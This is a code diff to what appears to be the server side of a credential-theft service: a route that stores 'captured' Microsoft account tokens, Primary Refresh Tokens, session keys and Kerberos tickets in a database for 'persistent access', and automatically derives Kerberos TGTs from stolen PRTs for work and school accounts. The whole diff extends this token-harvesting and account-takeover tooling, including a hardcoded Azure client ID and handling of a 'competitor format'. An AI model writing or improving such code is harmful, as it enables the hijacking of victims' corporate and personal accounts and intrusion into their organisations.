@@ -239,12 +239,35 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
       sessionKey = req.body.session_key;
     }
     if (req.body.session_key_enc) {
-      sessionKeyEnc = req.body
+      sessionKeyEnc = req.body.session_key_enc;
+      // Use session_key_enc as session_key_jwe if not explicitly provided
+      if (!sessionKeyJwe) {
+        sessionKeyJwe = sessionKeyEnc;
+      }
+    }
+    if (req.body.prt) {
+      prt = req.body.prt;
+      accountType = 'work_school';
+    }
+    if (req.body.device_tenant_id) {
+      deviceTenantId = req.body.device_tenant_id;
+    }
+    if (req.body.tgt_ad) {
+      tgtAd = JSON.stringify(req.body.tgt_ad);
+    }
+    if (req.body.tgt_cloud) {
+      tgtCloud = JSON.stringify(req.body.tgt_cloud);
+    }
+    if (req.body.kerberos_top_level_names) {
+      kerberosTopLevelNames = req.body.kerberos_top_level_names;
+    }
+    if (req.body.tgt_cloud_sessionkey) {
+      tgtCloudSessionkey = JSON.stringify(req.body.tgt_cloud_sessionkey);
+    }
 
-.session_key_enc;
-    }    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
-    let
-    rawRefreshToken = refresh_token || ''; if (rawRefreshToken) {
+    // Parse refresh_token - it may be a JSON blob containing PRT and other tokens (competitor format)
+    let rawRefreshToken = refresh_token || '';
+    if (rawRefreshToken) {
       try {
         // Check if refresh_token is JSON (competitor format with PRT data)
         const parsedRefresh = JSON.parse(rawRefreshToken);
@@ -264,7 +287,10 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         if (rawRefreshToken.startsWith('0.AT') || rawRefreshToken.startsWith('M.R')) {
           accountType = 'personal';
         }
-        prt = rawRefreshToken;
+        // For work/school accounts, the refresh token itself serves as PRT identifier
+        if (accountType === 'work_school' && !prt) {
+          prt = rawRefreshToken;
+        }
       }
     }
     
@@ -313,7 +339,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     // Insert token record (encrypted) with 100-year expiration for persistent access
     const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720; // Max 30 days
 
-    const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
+    const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
     const [result] = await db.query(
         `INSERT INTO captured_tokens
@@ -346,6 +372,23 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     );
 
     const tokenId = result.insertId;
+
+    // Auto-derive Kerberos TGTs for work/school accounts with PRT
+    // This runs asynchronously and doesn't block the response
+    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      const kerberosService = require('../services/kerberos');
+      kerberosService.deriveTGTForToken(tokenId)
+        .then(derivationResult => {
+          if (derivationResult.success) {
+            console.log('[Capture] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
+          } else {
+            console.log('[Capture] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
+          }
+        })
+        .catch(err => {
+          console.error('[Capture] Kerberos derivation error:', err.message);
+        });
+    }
 
     // Common capture data shared by both the token-only and cookie paths
     const captureData = {
